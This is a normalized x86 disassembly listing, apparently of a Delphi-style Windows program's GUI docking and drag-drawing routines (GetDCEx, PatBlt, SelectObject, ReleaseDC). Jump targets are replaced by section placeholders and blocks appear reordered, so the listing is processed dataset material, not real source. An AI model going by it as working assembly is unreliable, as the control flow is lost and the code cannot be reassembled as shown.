jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418e2c
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_44a1fc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44a1fc
pop ecx
mov eax ebx
call sub_40324c
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44a1fc
pop ecx
sub_44a230
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_44a1fc
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_40324c
xor eax eax
mov [ esi + 0x64 ] eax
sub_44a28c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44929c
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_44a2c8
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44a2c8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_44a535
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405eac
mov edx [ ebp - 0x8 ]
pop eax
call sub_404264
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
mov eax [ ebx + 0x14 ]
call sub_448a28
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405eac
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405eac
mov edx [ ebp - 0x10 ]
pop eax
call sub_404264
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_40324c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a53c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fc0
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_448dd8
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_448f50
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_448f8c
mov eax [ ebx + 0x18 ]
call sub_448dd8
mov [ edx + 0x18 ] eax
push esi
push sub_44aad8
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_449304
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_448f8c
mov eax [ esi + 0x64 ]
call sub_448f50
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_40324c
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_44aab0
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_40324c
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_448ad4
mov edx eax
mov eax edi
call sub_448f78
mov eax edi
call sub_448dd8
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_44aad8
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_449304
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_44aad8
mov edx [ eax + 0x14 ]
mov eax esi
call sub_449304
mov eax [ ebx + 0x14 ]
call sub_40324c
mov eax edi
call sub_40324c
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_44a544
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_4456dc
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_40800c
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_448f78
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_445648
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_448f78
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_44a960
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_44aad8
xor edx edx
mov eax edi
call sub_449304
sub_44a620
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_448f50
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402a14
mov edx eax
mov eax ebx
call sub_448f78
sub_44a65c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40444c
xor eax eax
push ebp
push sub_44a6c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40425c
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a6ce
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_44a6d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_44a783
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_448ce0
mov eax [ ebp - 0x8 ]
call sub_44a65c
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_44a6d4
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a78a
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_44a6d4
pop ecx
sub_44a790
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44a8c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44a878
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_445648
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a87f
mov eax [ ebp - 0x10 ]
call sub_40324c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_44a65c
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_44565c
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_44a87f
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_44a6d4
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a8d0
lea eax [ ebp - 0x14 ]
call sub_403f9c
retn
sub_44a8d8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_449028
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_449050
call sub_44a8d8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_449028
call sub_44a8d8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_448a58
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_448f50
mov edx eax
mov eax ebx
call sub_448f78
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_448f78
jmp r-xdata
sub_44a960
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_44a8d8
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_44a9a4
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_448f50
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_448f78
sub_44a9d4
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_446be4
mov edx eax
mov eax [ rw-data ]
call sub_44b534
mov eax [ ebx + 0x14 ]
call sub_446be4
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_44aae8
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44aa34
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_44b534
mov eax ebx
call sub_44aae8
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_448f78
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_448f78
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_44a960
push ebx
push sub_44aad8
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_449304
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_44aab0
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_445648
test eax eax
jle r-xdata
push ebx
push sub_44aad8
xor edx edx
mov eax ebx
call sub_449304
sub_44aae8
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_448b1c
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_448b1c
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_448b88
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_448b88
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_423754
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_44abd4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44abd4
pop ecx
mov eax ebx
call sub_448f50
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_448f50
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44abd4
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_448f50
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42a4d8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_44ac64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_448f50
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_448ad4
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_448f50
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_44abd4
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44acb4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_43fd64
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43fd64
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_44ad30
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4489e0
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_448a8c
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_449034
test eax eax
je r-xdata
mov eax esi
call sub_448a58
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_44aad8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_449304
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_449034
mov edx [ ebx + 0x20 ]
call sub_448f8c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_44ad30
pop ecx
sub_44adb0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_448a3c
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_448a3c
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_449034
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_44adb0
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_44aad8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_449304
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_448c38
mov eax edi
call sub_449028
test eax eax
je r-xdata
mov eax edi
call sub_449034
mov esi eax
mov eax esi
call sub_448f50
push eax
mov eax esi
call sub_448a8c
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_449028
call sub_448f50
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_448f50
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_448f78
mov eax esi
call sub_448f50
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_448f78
mov eax edi
call sub_449034
call sub_448fc8
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_448a8c
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_448f78
mov eax edi
call sub_449028
call sub_448fc8
mov bl 0x1
jmp r-xdata
sub_44aee8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44929c
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_418ddc
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_449a90
test eax eax
je r-xdata
push ebp
call sub_44ad30
pop ecx
push ebp
call sub_44adb0
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_44acb4
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_44af70
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_448b1c
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_448b1c
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_44ac64
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_44ac64
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_44affe
mov eax eax
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44b3d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406d48
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_449a90
mov esi eax
